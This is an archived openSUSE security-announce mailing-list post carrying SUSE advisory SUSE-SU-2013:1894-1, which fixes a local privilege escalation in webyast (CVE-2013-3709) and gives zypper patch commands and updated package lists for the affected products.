[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/#M7LMJML5HUV37OU6L57ANJVGX6HAYGLL)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from lists.opensuse.org_ff4e98d7_20250124_170242.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/#CK5UXGW74EGBDT36SCG26NCDWFIG2QYI)

# [security-announce] SUSE-SU-2013:1894-1: important: Security update for webyast

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

16 Dec
2013

16 Dec
'13

18:04

SUSE Security Update: Security update for webyast
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2013:1894-1
Rating: important
References: #851116
Cross-References: CVE-2013-3709
Affected Products:
WebYaST 1.3
SUSE Studio Onsite 1.3
SUSE Lifecycle Management Server 1.3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available. It
includes one version update.
Description:
The following security issue has been fixed:
\* CVE-2013-3709: webyast: local privilege escalation
via secret rails tokens execution. This vulnerability was
reported by joernchen of Phenoelit.
Security Issue reference:
\* CVE-2013-3709
<<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3709>

...

Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- WebYaST 1.3:
zypper in -t patch slewyst13-webyast-base-8608
- SUSE Studio Onsite 1.3:
zypper in -t patch slestso13-webyast-base-8608
- SUSE Lifecycle Management Server 1.3:
zypper in -t patch sleslms13-webyast-base-8608
To bring your system up-to-date, use "zypper patch".
Package List:
- WebYaST 1.3 (noarch) [New Version: 0.3.43.1]:
webyast-base-0.3.43.1-0.5.1
webyast-base-branding-default-0.3.43.1-0.5.1
- SUSE Studio Onsite 1.3 (noarch) [New Version: 0.3.43.1]:
webyast-base-0.3.43.1-0.5.1
webyast-base-branding-default-0.3.43.1-0.5.1
- SUSE Lifecycle Management Server 1.3 (noarch) [New Version: 0.3.43.1]:
webyast-base-0.3.43.1-0.5.1
webyast-base-branding-default-0.3.43.1-0.5.1
References:
<http://support.novell.com/security/cve/CVE-2013-3709.html>
<https://bugzilla.novell.com/851116>
[http://download.novell.com/patch/finder/?keywords=e33808e1f7a924a2aecffd6c2c...](http://download.novell.com/patch/finder/?keywords=e33808e1f7a924a2aecffd6c2cfef5e0)
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/CK5UXGW74EGBDT36SCG26NCDWFIG2QYI/#CK5UXGW74EGBDT36SCG26NCDWFIG2QYI)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugzilla.novell.com_6eb269f4_20250124_170247.html ===



